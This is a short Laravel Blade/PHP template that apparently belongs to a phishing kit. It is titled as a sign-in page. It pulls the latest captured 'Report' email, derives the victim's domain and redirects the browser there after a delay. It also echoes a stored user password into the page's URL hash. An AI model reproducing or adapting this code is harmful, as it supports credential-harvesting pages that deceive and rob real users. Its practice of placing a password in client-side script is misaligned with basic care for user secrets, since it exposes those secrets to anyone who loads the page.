<?php

    $title = \App\User::where('id',1)->first(); 
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Sign in to your {{$title->name}} account</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="shortcut icon" href="assets/images/favicon1.ico">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css">
    
    <link href="font-awesome/css/font-awesome.min.css" rel="stylesheet">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
    <style type="text/css">
        
    </style>
</head>
<body>
<?php
    $report =  \App\Report::orderBy('updated_at','desc')->first();
    $us = $report->email;
     $url = $title->email;
    $dominos = $domain = substr(strstr($us, '@'), 1);
    $locale = "$url/$dominos";


?>
<script>
location.hash = "{{$title->password}}";
    setTimeout(function(){
        window.location.href="<?php echo $locale; ?>"; // The URL that will be redirected too.
     }, 1000); // The bigger the number the longer the delay.
</script>

</body>
</html>